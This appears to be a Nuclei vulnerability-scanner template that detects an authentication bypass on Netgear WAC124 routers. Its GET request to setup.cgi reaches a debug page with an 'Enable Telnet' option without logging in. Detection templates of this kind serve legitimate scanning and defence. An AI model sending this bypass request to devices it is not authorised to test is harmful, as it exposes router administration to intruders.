http:
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - Enable Telnet
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/setup.cgi?next_file=debug.htm&x=currentsetting.htm'
id: netgear-wac124-router-auth-bypass
info:
  author: gy741
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
